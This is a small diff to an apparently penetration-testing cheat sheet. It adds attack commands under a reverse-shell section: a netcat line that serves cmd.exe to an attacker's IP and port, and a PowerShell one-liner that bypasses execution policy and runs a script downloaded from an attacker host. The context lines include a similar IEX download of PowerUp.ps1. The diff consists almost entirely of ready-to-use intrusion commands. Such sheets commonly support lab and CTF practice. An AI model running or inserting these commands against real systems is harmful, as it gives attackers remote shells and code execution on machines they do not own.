@@ -223,6 +223,7 @@ Reverse Shells
 
 #Windows
 - https://github.com/Dhayalanb/windows-php-reverse-shell
+- nc [YourIPaddr] [port] –e cmd.exe
 
 Shell Upgrading
 ----------------
@@ -370,6 +371,10 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp
 ```
 ```
 IEX(New-object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1')
+
+```
+```
+powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Whatever.ps1'); Invoke-Whatever"
 ```
 - Reverse Powershell using mssql:
 ```
